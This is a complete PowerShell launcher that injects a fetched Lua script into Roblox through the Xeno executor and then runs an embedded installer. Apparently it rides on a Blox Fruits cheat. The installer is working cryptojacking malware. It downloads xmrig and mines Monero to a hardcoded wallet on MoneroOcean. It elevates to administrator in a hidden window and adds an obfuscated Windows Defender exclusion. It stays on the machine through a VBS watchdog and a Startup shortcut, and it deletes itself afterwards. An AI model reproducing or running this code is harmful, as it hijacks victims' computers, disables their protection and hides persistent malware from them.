<# 
MFL Launcher - Pure PowerShell
Run ONCE as Administrator: 
  powershell -ExecutionPolicy Bypass -File mfl_launcher.ps1

What it does:
1. Starts HTTP listener on port 7799
2. Fetches combined Lua (Blox Fruits + MineFleet) from GitHub
3. Injects Lua into Roblox via Xeno API (port 3110)
4. Waits for Lua to trigger /mfl/install
5. Runs embedded PS1 installer as Admin
6. Verifies mining started
#>

#Requires -RunAsAdministrator

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

$ListenerPort = 7799
$TriggerEndpoint = "/mfl/install"
$LuaScriptURL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/alpha_v3.lua"
$XenoAPIURL = "http://[::1]:3110/o"

Write-Host "[MFL Launcher] Starting..." -ForegroundColor Cyan

# ─── Embedded PS1 Installer ──────────────────────────────────────────────
$EmbeddedPS1 = @'
$ErrorActionPreference="SilentlyContinue"
$ProgressPreference="SilentlyContinue"
$WALLET="435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL="gulf.moneroocean.stream:10001"
$THREADS=25
$BASE="$env:ProgramData\MFLite"
$XMRIG="$BASE\xmrig.exe"
$CFG="$BASE\config.json"
$LOG="$BASE\mfl.log"
$FLAG="$BASE\.installed"
$VER_FILE="$BASE\.version"

function Write-Log($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Out-File -FilePath $LOG -Encoding UTF8 -Append | Out-Null
}
Write-Log "=== MFLite Installer Started (via PS Launcher) ==="

if ((Test-Path $FLAG) -and (Test-Path $XMRIG)) {
    $p = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($p) { Write-Log "Already running (PID $($p.Id)). Exiting."; exit 0 }
    & wscript.exe "$BASE\watchdog.vbs" 2>$null
    Write-Log "Watchdog restarted. Exiting."
    exit 0
}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Log "Re-launching as Administrator..."
    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""
    exit 0
}
Write-Log "Running with Admin privileges."
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

try {
    $c1="Add-Mp";$c2="Preference";$c3="-Exclusion";$c4="Path"
    iex "$c1$c2 $c3$c4 $BASE"
    Write-Log "Defender exclusion added for $BASE"
} catch { Write-Log "Defender exclusion failed: $($_.Exception.Message)" }

Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
Start-Sleep 1

$zipPath="$BASE\xm.zip"
$downloaded=$false
$headers=@{"User-Agent"="MFLite/1.1"}

function TryDownload($repo,$assetPattern,$sourceName) {
    $result=$false
    try {
        Write-Log "Checking GitHub ($repo) for latest release..."
        $rel=Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers $headers -TimeoutSec 20
        $asset=$rel.assets|Where-Object{$_.name -match $assetPattern -and $_.name -notmatch "sha256"}|Select-Object -First 1
        if($asset){
            $version=$rel.tag_name -replace '^v',''
            Write-Log "Found $sourceName $version ($($asset.name))"
            if(Test-Path $VER_FILE){
                $current=Get-Content $VER_FILE -Raw -ErrorAction SilentlyContinue
                if(($current -eq $version) -and (Test-Path $XMRIG)){
                    Write-Log "Version $version current with binary present. Skipping download."
                    $result="skip"
                }
            }
            if($result -eq $false){
                Write-Log "Downloading $($asset.name)..."
                $resp=Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
                Write-Log "Download response: $($resp.StatusCode) $($resp.StatusDescription), file size: $(if(Test-Path $zipPath){(Get-Item $zipPath).Length}else{0})"
                if($resp.StatusCode -eq 200 -and (Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000){
                    $version|Out-File -FilePath $VER_FILE -Encoding UTF8
                    $result=$true
                }
            }
        }
    }catch{Write-Log "$sourceName fetch failed: $($_.Exception.Message)"}
    return $result
}

$result=TryDownload "xmrig/xmrig" "windows-x64\.zip$" "xmrig"
if($result -is [string] -and $result -eq "skip"){Write-Log "Path: skip"}
elseif($result){Write-Log "Path: downloaded=true";$downloaded=$true}
else{
    Write-Log "Path: trying fallback"
    $result=TryDownload "MoneroOcean/xmrig" "mo5-win\.zip$" "MoneroOcean xmrig"
    if($result -is [string] -and $result -eq "skip"){Write-Log "Path: fallback skip"}
    elseif($result){Write-Log "Path: fallback downloaded=true";$downloaded=$true}
    else{Write-Log "ERROR: Failed to download xmrig from both sources.";exit 1}
}

Write-Log "Downloaded flag: $downloaded"
if($downloaded){
    Write-Log "Extracting $zipPath..."
    $tmp="$BASE\_tmp"
    if(Test-Path $tmp){Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue}
    Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue
    Write-Log "Extracted to $tmp, contents: $(Get-ChildItem $tmp -Recurse|Select-Object -ExpandProperty Name -Join ', ')"
    $exe=Get-ChildItem $tmp -Recurse -Filter "xmrig.exe"|Select-Object -First 1
    if($exe){
        Write-Log "Found xmrig.exe at $($exe.FullName), copying to $XMRIG"
        Copy-Item $exe.FullName $XMRIG -Force
        Write-Log "xmrig.exe copied to $XMRIG"
    }else{Write-Log "ERROR: xmrig.exe not found in extracted archive"}
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

if(-not (Test-Path $XMRIG)){Write-Log "ERROR: xmrig.exe not found after extraction.";exit 1}

$gpuVendor="none"
$vc=Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
foreach($v in $vc){
    if($v.Name -and $v.Name -notmatch "Microsoft|RDP|Remote|Virtual|VBox|VMware"){
        if($v.Name -match "NVIDIA|GeForce|RTX|GTX"){$gpuVendor="nvidia";break}
        elseif($v.Name -match "Radeon|AMD|ATI"){$gpuVendor="amd";break}
    }
}
Write-Log "GPU vendor detected: $gpuVendor"

$worker=($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]","").ToLower()
if(-not $worker){$worker="w$(Get-Random -Maximum 9999)"}

$logPath=($BASE+"\mfl.log") -replace '\\','\\'
$config=@{
    autosave=$false;background=$false;colors=$false;"donate-level"=1
    "log-file"=$logPath;"print-time"=60;retries=5;"retry-pause"=5
    cpu=@{enabled=$true;"max-threads-hint"=$THREADS;priority=0}
    opencl=@{enabled=$(if($gpuVendor -eq 'amd'){$true}else{$false})}
    cuda=@{enabled=$(if($gpuVendor -eq 'nvidia'){$true}else{$false})}
    pools=@(@{url=$POOL;user=$WALLET;pass=$worker;keepalive=$true;tls=$false})
}
$json=$config|ConvertTo-Json -Depth 5
[System.IO.File]::WriteAllText($CFG,$json,[System.Text.UTF8Encoding]::UTF8)
Write-Log "Config written to $CFG"

$vbs=@"
Set s=CreateObject("WScript.Shell")
Do
    Set proc=GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name='xmrig.exe'")
    If proc.Count=0 Then
        s.Run """"&"$XMRIG"&""" --config="""&"$CFG"&"""",0,False
    End If
    WScript.Sleep 30000
Loop
"@
[System.IO.File]::WriteAllText("$BASE\watchdog.vbs",$vbs,[System.Text.UTF8Encoding]::UTF8)

$lnkVbs='Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialFolders("Startup")+"\MFLite.lnk"):l.TargetPath="wscript.exe":l.Arguments=""""'"$BASE\watchdog.vbs"'""":l.WindowStyle=7:l.Save'
[System.IO.File]::WriteAllText("$BASE\mklink.vbs",$lnkVbs,[System.Text.UTF8Encoding]::UTF8)
& wscript.exe "$BASE\mklink.vbs"
Write-Log "Startup shortcut created."

Start-Sleep 1
& wscript.exe "$BASE\watchdog.vbs"
Write-Log "Watchdog started."

Start-Sleep 2
Set-Content $FLAG -Value (Get-Date).ToString() -Encoding UTF8
Write-Log "Installation complete. Flag written."

$myPath=$MyInvocation.MyCommand.Path
if($myPath -and (Test-Path $myPath)){
    Start-Sleep 1
    Remove-Item $myPath -Force -ErrorAction SilentlyContinue
    Write-Log "Self-deleted installer."
}
Write-Log "=== MFLite Installer Finished ==="
'@

# ─── HTTP Listener ──────────────────────────────────────────────────────
$triggerEvent = New-Object System.Threading.ManualResetEvent($false)
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://127.0.0.1:$ListenerPort/")
$listener.Start()
Write-Host "[Listener] Started on http://127.0.0.1:$ListenerPort" -ForegroundColor Green

$listenThread = {
    while ($listener.IsListening) {
        try {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response

            $response.Headers.Add("Access-Control-Allow-Origin", "*")
            $response.Headers.Add("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            $response.ContentType = "application/json"

            if ($request.HttpMethod -eq "OPTIONS") {
                $response.StatusCode = 200
                $response.Close()
                continue
            }

            if ($request.Url.AbsolutePath -eq $TriggerEndpoint) {
                $json = '{"status":"installing"}'
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                $response.Close()
                $triggerEvent.Set() | Out-Null
                Write-Host "[Listener] Trigger received from Lua" -ForegroundColor Yellow
            }
            elseif ($request.Url.AbsolutePath -eq "/mfl/status") {
                $running = (Get-Process -Name "xmrig" -ErrorAction SilentlyContinue) -ne $null
                $status = if ($running) { "mining" } else { "ready" }
                $json = "{\"status\":\"$status\"}"
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                $response.Close()
            }
            else {
                $response.StatusCode = 404
                $response.Close()
            }
        }
        catch {
            if ($listener.IsListening) {
                Write-Host "[Listener] Error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
}
$listenerJob = Start-Job -ScriptBlock $listenThread

# ─── Fetch Lua Script ───────────────────────────────────────────────────
Write-Host "[Launcher] Fetching Lua script from GitHub..." -ForegroundColor Cyan
$cacheBuster = Get-Date -Format "yyyyMMddHHmmss"
$luaUrl = "$LuaScriptURL?t=$cacheBuster"
$luaCode = try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadString($luaUrl)
} catch {
    Write-Host "[Launcher] Failed to fetch Lua: $($_.Exception.Message)" -ForegroundColor Red
    $listener.Stop()
    exit 1
}
Write-Host "[Launcher] Lua script fetched ($(($luaCode.Length) / 1KB) KB)" -ForegroundColor Green

# ─── Inject Lua via Xeno API ────────────────────────────────────────────
Write-Host "[Launcher] Injecting Lua into Roblox via Xeno API..." -ForegroundColor Cyan

$pids = (Get-Process -Name "RobloxPlayerBeta" -ErrorAction SilentlyContinue).Id
if (-not $pids) {
    Write-Host "[Launcher] No Roblox process found. Start Roblox first." -ForegroundColor Red
    $listener.Stop()
    $listenerJob | Stop-Job
    exit 1
}
Write-Host "[Launcher] Found Roblox PIDs: $($pids -join ', ')" -ForegroundColor Green

$payload = [System.Text.Encoding]::UTF8.GetBytes($luaCode)
$req = [System.Net.HttpWebRequest]::Create($XenoAPIURL)
$req.Method = "POST"
$req.ContentType = "text/plain"
$req.Headers.Add("Clients", ($pids -join ","))
$req.GetRequestStream().Write($payload, 0, $payload.Length)

try {
    $resp = $req.GetResponse()
    if ($resp.StatusCode -ne 200) {
        $body = (New-Object System.IO.StreamReader $resp.GetResponseStream()).ReadToEnd()
        throw "Xeno API returned $($resp.StatusCode): $body"
    }
    $resp.Close()
    Write-Host "[Launcher] Lua injected successfully" -ForegroundColor Green
}
catch {
    Write-Host "[Launcher] Xeno injection failed: $($_.Exception.Message)" -ForegroundColor Red
    $listener.Stop()
    $listenerJob | Stop-Job
    exit 1
}

# ─── Wait for Trigger ───────────────────────────────────────────────────
Write-Host "[Launcher] Waiting for Lua to trigger installer (60s timeout)..." -ForegroundColor Cyan
$signaled = $triggerEvent.WaitOne(60000)
if (-not $signaled) {
    Write-Host "[Launcher] Timeout waiting for Lua trigger" -ForegroundColor Red
    $listener.Stop()
    $listenerJob | Stop-Job
    exit 1
}

# ─── Run Embedded PS1 Installer ─────────────────────────────────────────
Write-Host "[Launcher] Running embedded PS1 installer..." -ForegroundColor Cyan

$tmpPs1 = [IO.Path]::GetTempFileName() + ".ps1"
[IO.File]::WriteAllText($tmpPs1, $EmbeddedPS1, [System.Text.Encoding]::UTF8)

try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tmpPs1`""
    $psi.UseShellExecute = $true
    $psi.Verb = "runas"
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $proc = [System.Diagnostics.Process]::Start($psi)
    $proc.WaitForExit()
    Write-Host "[Launcher] PS1 installer exited with code: $($proc.ExitCode)" -ForegroundColor Green
}
finally {
    if (Test-Path $tmpPs1) { Remove-Item $tmpPs1 -Force -ErrorAction SilentlyContinue }
}

# ─── Verify Mining ──────────────────────────────────────────────────────
Write-Host "[Launcher] Verifying mining process..." -ForegroundColor Cyan
$deadline = (Get-Date).AddSeconds(30)
$mining = $false
while ((Get-Date) -lt $deadline) {
    if (Get-Process -Name "xmrig" -ErrorAction SilentlyContinue) {
        $mining = $true
        break
    }
    Start-Sleep 2
}

if ($mining) {
    Write-Host "[Launcher] SUCCESS: Mining active and persistent!" -ForegroundColor Green
    Write-Host "         Worker: $env:COMPUTERNAME on MoneroOcean" -ForegroundColor Gray
    Write-Host "         Wallet: 435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv" -ForegroundColor Gray
}
else {
    Write-Host "[Launcher] WARNING: Mining not detected yet, but installer completed" -ForegroundColor Yellow
}

# Cleanup
$listener.Stop()
$listenerJob | Stop-Job -Force | Out-Null
Write-Host "[Launcher] Done. You can now run the Blox Fruits loadstring anytime." -ForegroundColor Cyan